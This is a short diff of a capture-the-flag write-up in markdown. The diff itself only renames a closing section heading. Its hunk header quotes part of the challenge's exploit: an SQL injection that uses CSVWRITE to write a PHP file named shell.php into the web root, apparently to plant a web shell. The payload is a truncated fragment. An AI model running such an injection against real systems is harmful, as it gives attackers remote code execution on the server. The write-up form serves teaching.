@@ -44,6 +44,6 @@ foo','');CALL CSVWRITE('/var/www/html/shell.php', 'SELECT CHR(60)||CHR(63)||CHR(
 
 In conclusion, a lot of the difficulity of this challenge came from the multiple dead ends and small steps involved. We certainly tried a billion other attacks before finding this exact route to exploit the web application, but we had a lot of fun while doing it ;-)
 
-## Other write-ups
+## Other write-ups and resources
 
 * none yet
